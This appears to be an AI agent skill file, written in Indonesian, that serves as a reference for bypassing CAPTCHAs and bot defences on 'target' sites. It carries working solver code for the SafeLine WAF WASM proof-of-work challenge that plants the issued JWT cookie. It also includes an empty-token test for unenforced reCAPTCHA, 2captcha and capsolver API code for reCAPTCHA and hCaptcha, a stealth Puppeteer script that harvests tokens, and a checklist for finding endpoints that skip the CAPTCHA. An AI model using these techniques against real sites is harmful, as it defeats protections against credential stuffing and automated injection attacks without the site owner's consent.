---
name: bypass-captcha
description: "Teknik bypass CAPTCHA — reCAPTCHA v2/v3, hCaptcha, SafeLine WASM PoW, slider challenge. Termasuk solver otomatis, token hijack, dan implementasi Python. Gunakan saat target memiliki CAPTCHA yang memblokir automation/injection testing."
---

# CAPTCHA Bypass Master Reference

## 1. SAFELINE WASM POW CHALLENGE

SafeLine menggunakan WebAssembly Proof-of-Work challenge (bukan image CAPTCHA).

### Flow
```
1. GET target → status 468 + HTML berisi SafeLineChallenge("client_id")
2. POST waf.chaitin.com/challenge/v2/api/issue → dapat puzzle data
3. Solve dengan WASM (calc.wasm)
4. POST waf.chaitin.com/challenge/v2/api/verify → dapat JWT
5. Set cookie sl-challenge-jwt=JWT
6. Akses normal
```

### Solver (Python + Node.js)
```python
import requests, re, json, subprocess

CDN  = 'https://waf.chaitin.com'
WASM = '/tmp/calc.wasm'  # Download: curl https://waf.chaitin.com/static/wasm/calc.wasm -o /tmp/calc.wasm

def solve_safeline(BASE, session=None):
    s = session or requests.Session()
    r = s.get(BASE, verify=False, timeout=15)
    
    # Cek apakah ada challenge
    if r.status_code not in [468, 200]: return None
    m = re.search(r'SafeLineChallenge\("([^"]+)"', r.text)
    if not m: return s  # Tidak ada challenge
    
    cid = m.group(1)
    
    # Issue challenge
    ir = requests.post(f'{CDN}/challenge/v2/api/issue',
                       json={'client_id':cid, 'level':1, 'input_type':'slide'},
                       headers={'Content-Type':'application/json', 'Origin':BASE},
                       timeout=10)
    iss = ir.json()['data']
    
    # Solve WASM dengan Node.js
    node_code = f"""
const fs = require('fs');
(async () => {{
    const {{instance}} = await WebAssembly.instantiate(fs.readFileSync('{WASM}'));
    const e = instance.exports;
    const d = {json.dumps(iss['data'])};
    e.reset();
    d.forEach(v => e.arg(v));
    const n = e.calc();
    console.log(JSON.stringify(Array(n).fill(0).map(() => e.ret())));
}})()
"""
    result = json.loads(
        subprocess.run(['node', '-e', node_code], capture_output=True, text=True, timeout=15).stdout.strip()
    )
    
    # Verify dan dapat JWT
    vr = requests.post(f'{CDN}/challenge/v2/api/verify',
                       json={'issue_id': iss['issue_id'], 'result': result,
                             'serials': [], 'input_type': 'slide', 'client': {}},
                       headers={'Content-Type':'application/json', 'Origin':BASE},
                       timeout=10)
    
    jwt = vr.json()['data']['jwt']
    domain = BASE.replace('https://','').replace('http://','').split('/')[0]
    s.cookies.set('sl-challenge-jwt', jwt, domain=domain, path='/')
    return s
```

### Setup
```bash
# Install Node.js
apt install -y nodejs

# Download WASM solver
curl -s 'https://waf.chaitin.com/static/wasm/calc.wasm' -o /tmp/calc.wasm

# Test WASM
node -e "const fs=require('fs'); const m=WebAssembly.instantiateSync(fs.readFileSync('/tmp/calc.wasm')); console.log(typeof m.instance.exports.calc)"
```

---

## 2. RECAPTCHA V3

reCAPTCHA v3 menilai "bot score" tanpa interaksi user.

### Ciri-ciri
- Hidden di form HTML
- Token: `<input type="hidden" name="token" id="token">`
- JS: `grecaptcha.execute(SITEKEY, {action: 'submit'})`
- Server-side bisa enforce score threshold (0.0–1.0)

### Metode Bypass

#### A. Token Harvest (jika server tidak enforce ketat)
```python
# Banyak app tidak verify token ke server Google
# Test: kirim dengan token="" atau token="bypass_test"
# Jika login tetap jalan → reCAPTCHA tidak di-enforce!
data = {'uname': 'test', 'passwd': 'test', 'token': '', 'csrf_test_name': csrf}
r = s.post(url, data=data)
# sc=200/302 bukan 400 → tidak di-enforce
```

#### B. 2captcha / Anti-Captcha Service
```python
import requests, time

def solve_recaptcha_v3(sitekey, page_url, action='submit'):
    # 2captcha API
    API_KEY = 'YOUR_2CAPTCHA_KEY'
    
    # Submit task
    r = requests.post('https://2captcha.com/in.php', data={
        'key': API_KEY,
        'method': 'userrecaptcha',
        'googlekey': sitekey,
        'pageurl': page_url,
        'version': 'v3',
        'action': action,
        'min_score': '0.3',
        'json': 1
    })
    task_id = r.json()['request']
    
    # Poll for result
    for _ in range(30):
        time.sleep(5)
        r = requests.get(f'https://2captcha.com/res.php?key={API_KEY}&action=get&id={task_id}&json=1')
        if r.json().get('status') == 1:
            return r.json()['request']
    return None
```

#### C. Scraping token dari browser (jika ada akses manual)
```javascript
// Di browser console saat halaman login terbuka
grecaptcha.execute('SITEKEY', {action: 'submit'}).then(token => {
    console.log(token);  // Copy token ini
});
```

#### D. puppeteer / playwright (headless browser)
```javascript
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
puppeteer.use(StealthPlugin());

const browser = await puppeteer.launch({headless: true});
const page = await browser.newPage();
await page.goto(loginUrl);
// tunggu grecaptcha load
await page.waitForFunction('typeof grecaptcha !== "undefined"');
const token = await page.evaluate(async (key) => {
    return await grecaptcha.execute(key, {action: 'submit'});
}, siteKey);
```

---

## 3. RECAPTCHA V2 (Image/Checkbox)

#### A. 2captcha
```python
r = requests.post('https://2captcha.com/in.php', data={
    'key': API_KEY,
    'method': 'userrecaptcha',
    'googlekey': sitekey,
    'pageurl': page_url,
    'json': 1
})
```

#### B. Audio challenge bypass
```python
# Use speech-to-text on audio challenge
# SpeechRecognition + pydub
```

---

## 4. HCAPTCHA

```python
# Similar to reCAPTCHA, gunakan 2captcha atau capsolver
r = requests.post('https://2captcha.com/in.php', data={
    'key': API_KEY, 'method': 'hcaptcha',
    'sitekey': sitekey, 'pageurl': page_url, 'json': 1
})
```

---

## 5. SLIDER / PUZZLE CAPTCHA

SafeLine menggunakan slider puzzle. Disimulasikan dengan WASM solver di atas.

Untuk target lain:
```python
# Geetest (slider)
# Tool: https://github.com/Rost-is-love/geetest-bypass
# API: capsolver.com untuk Geetest v3/v4
```

---

## TOOLS REFERENSI

| Tool | Fungsi |
|------|--------|
| 2captcha.com | Human-solver service |
| capsolver.com | AI-solver (lebih murah) |
| puppeteer-extra-stealth | Headless browser anti-detect |
| playwright | Browser automation |
| undetected-chromedriver | Python selenium anti-detect |

---

## CHECKLIST BYPASS CAPTCHA

1. ☐ Test apakah token di-enforce server-side (kirim kosong)
2. ☐ Identifikasi tipe CAPTCHA (reCAPTCHA v2/v3, hCaptcha, custom)
3. ☐ Cek sitekey di HTML source
4. ☐ Cek apakah ada endpoint yang skip CAPTCHA (API, mobile)
5. ☐ Gunakan 2captcha/capsolver untuk human/AI solving
6. ☐ Untuk SafeLine: gunakan WASM solver di atas
